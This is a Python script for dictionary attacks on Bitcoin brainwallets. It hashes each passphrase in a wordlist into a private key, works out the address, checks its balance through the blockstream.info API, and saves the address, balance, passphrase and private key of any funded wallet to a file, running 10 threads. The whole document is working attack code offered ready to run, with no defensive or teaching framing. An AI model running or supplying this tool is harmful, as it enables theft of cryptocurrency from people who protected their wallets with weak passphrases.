import hashlib
import requests
import threading
from bitcoin import *
from queue import Queue

electrum_url = "https://blockstream.info/api/address/"
result_file = "found_wallets.txt"

lock = threading.Lock()
q = Queue()

def sha256(data):
    return hashlib.sha256(data.encode('utf-8')).digest()

def passphrase_to_privkey(passphrase):
    return hashlib.sha256(passphrase.encode('utf-8')).hexdigest()

def privkey_to_address(privkey_hex):
    pub = privtopub(privkey_hex)
    addr = pubtoaddr(pub)
    return addr, pub

def check_balance(addr):
    try:
        response = requests.get(f"{electrum_url}{addr}")
        if response.status_code == 200:
            data = response.json()
            funded = data['chain_stats']['funded_txo_sum']
            spent = data['chain_stats']['spent_txo_sum']
            balance = funded - spent
            return balance / 100000000  # convert to BTC
        else:
            return None
    except Exception as e:
        return None

def worker():
    while not q.empty():
        passphrase = q.get()
        privkey = passphrase_to_privkey(passphrase)
        address, pubkey = privkey_to_address(privkey)
        balance = check_balance(address)
        if balance is not None:
            if balance > 0:
                with lock:
                    print(f"[💰 FOUND] {address} | Balance: {balance:.8f} BTC | Pass: {passphrase}")
                    try:
                        with open(result_file, "a") as f:
                            f.write(f"{address},{balance:.8f},{passphrase},{privkey}\n")
                    except Exception as e:
                        print(f"Error writing to file: {e}")
            else:
                print(f"[❌] {address} | 0 BTC | Pass: {passphrase}")
        else:
            print(f"[⚠️] Could not get balance for {address}")
        q.task_done()

def main():
    print("🔍 Loading passphrases...")
    with open("wordlist.txt", "r", encoding="utf-8") as f:
        for line in f:
            q.put(line.strip())

    threads = []
    for _ in range(10):  # You can increase to 20+ if your internet & CPU are fast
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()
    print("\n✅ Done scanning!")

if __name__ == "__main__":
    main()
